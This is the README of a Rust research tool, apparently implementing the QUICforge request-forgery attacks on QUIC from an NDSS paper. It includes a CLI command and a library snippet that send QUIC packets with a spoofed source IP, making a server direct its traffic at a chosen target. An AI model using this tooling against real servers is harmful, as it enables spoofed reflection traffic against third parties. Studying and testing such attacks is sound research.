# Hephaestus - QUICforge in Rust

This project is an implementation of the attacks on the QUIC protocol introduced in [QUICforge: Client-side Request Forgery in QUIC](https://www.ndss-symposium.org/wp-content/uploads/2023/02/ndss2023_s72_paper.pdf).

## Project Layout

- `hephaestus-core`: Library implementing the functionality of the attacks.
- `hephaestus`: CLI to execute attacks.

## Usage

The CLI (currently) provides two subcommands, corresponding to the two attack types that are supported:

- `sirf`: Server Initial Request Forgery, i.e. spoofind the source IP on the initial packet such that the server initial packet is sent to the target
- `vnrf`: Version Negotiation Request Forgery, i.e. spoofind the source IP and setting an unsupported version ID, prompting the server to send a version negotiation packet to the target

See the paper for a detailed description of these attacks.

### Example

Suppose the victim server is running on `127.0.0.1:4433`. The following command sends a QUIC initial packet with spoofed source IP, version ID, Destination and Source Connection ID to the victim.
In this case the source IP is set to `127.0.0.1:1234`.

`cargo run -- --victim-addr 127.0.0.1:4433 --target-addr 127.0.0.1:1234 vnrf --dcid AAAAAAAAAAAAAAAAAAAAAAAA --scid BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB`

The syntax for SIRF is pretty much identical, but you can only set the Source Connection ID and its length is limited to 20 bytes.

## Hephaestus-Core

The main entry point to the library is the `crate::network::Harness` struct, which handles spoofing the IP/UDP packet and handling the QUIC client. The client is represented by a the `Client` trait
and the harness is generic over the implementation of `Client`.

### Example

```rust
// Creating a payload
let payload = Payload {
    dcid: vec![4, 20],
    scid: vec![2, 20],
    version: 0x13371337,
};

let victim_addr = "127.0.0.1:4435".parse().unwrap();
let target_addr = "127.0.0.1:1234".parse().unwrap();

// Initializing a harness to a given victim and target address that uses the QuinnClient implementation of Client
let mut harness = Harness::<QuinnClient>::new(victim_addr, target_addr).unwrap();

// Run the attack. Runs until the initial packet is sent to the victim.
harness.run(payload).await?;
```

For a more extensive example, including setting up a victim server and intercepting its response, see the integration tests in `hephaestus_core/tests`.
